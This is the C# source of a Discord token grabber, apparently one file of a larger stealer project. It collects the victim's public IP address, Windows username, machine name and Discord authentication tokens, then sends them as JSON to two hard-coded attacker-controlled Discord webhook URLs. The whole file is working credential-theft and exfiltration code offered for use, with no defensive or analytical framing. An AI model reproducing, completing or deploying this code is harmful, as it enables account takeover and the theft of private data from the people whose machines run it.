using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace Token_Grabber
{
    public class PrintAllInfo
    {
        public static string weblink = ("https://api.ipify.org/");
        public PrintAllInfo()
        {
            GetIp();
            SendInfo();
        }

        static void SendInfo()
        {
            bool isAscii;
            bool FirstTokenFailed = false;
            bool SecondTokenFailed = false;

            //Discord webhook url
            string url = "https://discord.com/api/webhooks/959071811419652096/dOkV-5nK6JXpqa-86ODdZfbkAaV9UhJ9fzlLf3Ta-35SmGYjkY_XZCxGsYdAfbERDZUT";
            string virtualurl = "https://discord.com/api/webhooks/959854762340253738/5ijYU_Tu4sTBzz4rXOlEWEYpAiSAL0vC5GUXLKYIAsq5ArL9jbHzt5N5SqPTiWbkrmrX";
            string json = "{\"username\": \"Discord Token Grabber\",\"embeds\":[ {\"description\": \" \\n \\n \\n \\n\\n\", \"title\":\"Info:\", \"color\":1018364}] }";

            int IpLength = GetIp().Length;
            int UsernameLength = Environment.UserName.Length;
            int PCNameLength = Environment.MachineName.Length;

            string newjson = json.Insert(65, $"{GetIp()}");
            newjson = newjson.Insert(68 + IpLength, $"{Environment.UserName}");
            newjson = newjson.Insert(71 + UsernameLength + IpLength, $"{Environment.MachineName}");
            try
            {
                string virtualjson = newjson.Insert(77 + UsernameLength + IpLength + Environment.MachineName.Length, $"{DiscordToken.matchs[0]}");
                SendDiscordWebhook(virtualurl, virtualjson);
            }
            catch
            {
                FirstTokenFailed = true;
            }
            try
            {
                if (SecondTokenFailed == true)
                {
                    string virtualjson = newjson.Insert(77 + UsernameLength + IpLength + Environment.MachineName.Length, $"{DiscordToken.matchs[1]}");
                    SendDiscordWebhook(virtualurl, virtualjson);
                }
            }
            catch
            {
                string virtualjson = newjson.Insert(77 + UsernameLength + IpLength + Environment.MachineName.Length, $"{DiscordToken.matchs[2]}");
                SendDiscordWebhook(virtualurl, virtualjson);
            }

            if(!FirstTokenFailed)
            {
                newjson = newjson.Insert(77 + UsernameLength + IpLength + Environment.MachineName.Length, $"{DiscordToken.matchs[0]}");
                SendDiscordWebhook(url, newjson);
            }
            if(!SecondTokenFailed)
            {
                newjson = newjson.Insert(77 + UsernameLength + IpLength + Environment.MachineName.Length, $"{DiscordToken.matchs[1]}"); ;
                SendDiscordWebhook(url, newjson);
            }
            else
            {
                newjson = newjson.Insert(77 + UsernameLength + IpLength + Environment.MachineName.Length, $"{DiscordToken.matchs[2]}"); ;
                SendDiscordWebhook(url, newjson);
            }



        }

        public static void SendDiscordWebhook(string URL, string escapedjson)
        {
            var wr = WebRequest.Create(URL);
            wr.ContentType = "application/json";
            wr.Method = "POST";
            using (var sw = new StreamWriter(wr.GetRequestStream()))
                sw.Write(escapedjson);
            wr.GetResponse();
        }

        public static string GetIp()
        {
            string ip = new WebClient().DownloadString(weblink);
            return ip;
        }


    }

    public class GetInfo
    {
        public static string Ip = PrintAllInfo.GetIp();
        public static string PCName = Environment.MachineName;
        public static string Username = Environment.UserName;
        public static string Token1 = DiscordToken.matchs[0];
        public static string Token2 = DiscordToken.matchs[1];
        public static string Token3 = DiscordToken.matchs[2];
        public static string Token4 = DiscordToken.matchs[3];
        public static string Token5 = DiscordToken.matchs[4];
        public static string Token6 = DiscordToken.matchs[5];

    }
}
